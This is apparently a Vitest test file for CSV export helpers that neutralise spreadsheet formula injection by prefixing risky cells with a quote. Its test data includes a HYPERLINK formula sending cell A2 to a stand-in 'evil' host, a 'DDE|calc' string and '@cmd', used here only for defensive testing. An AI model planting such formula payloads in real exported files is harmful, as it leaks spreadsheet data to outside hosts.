import { describe, expect, it } from "vitest";

import { csvCell, listToCsv, quotedCsvCell } from "./csv-cell";

describe("csvCell", () => {
  it("guards a formula-looking start and leaves ordinary text alone", () => {
    expect(csvCell("=SUM(A1)")).toBe("'=SUM(A1)");
    expect(csvCell("@cmd")).toBe("'@cmd");
    expect(csvCell("Acme Sdn Bhd")).toBe("Acme Sdn Bhd");
  });
  it("quotes where it must, after guarding", () => {
    expect(csvCell('=HYPERLINK("x","y")')).toBe(`"'=HYPERLINK(""x"",""y"")"`);
  });
});

describe("listToCsv", () => {
  it("quotes every cell and guards a registered name typed as a formula", () => {
    const name = '=HYPERLINK("http://evil/?"&A2,"Acme")';
    const csv = listToCsv(["Supplier", "Reference"], [[name, "SUP-1"], ["+60 12 345", "-"], ["\tx", "plain"]]);
    expect(csv.split("\r\n")).toEqual([
      '"Supplier","Reference"',
      `"'=HYPERLINK(""http://evil/?""&A2,""Acme"")","SUP-1"`,
      `"'+60 12 345","'-"`,
      `"'\tx","plain"`,
    ]);
    expect(quotedCsvCell("DDE|calc")).toBe('"DDE|calc"');
  });
  it("never lets a cell begin with a formula character once written", () => {
    for (const bad of ["=1+1", "+1", "-1", "@SUM(1)", "\t=1", "\r=1"]) expect(quotedCsvCell(bad)).toMatch(/^"'/);
  });
});
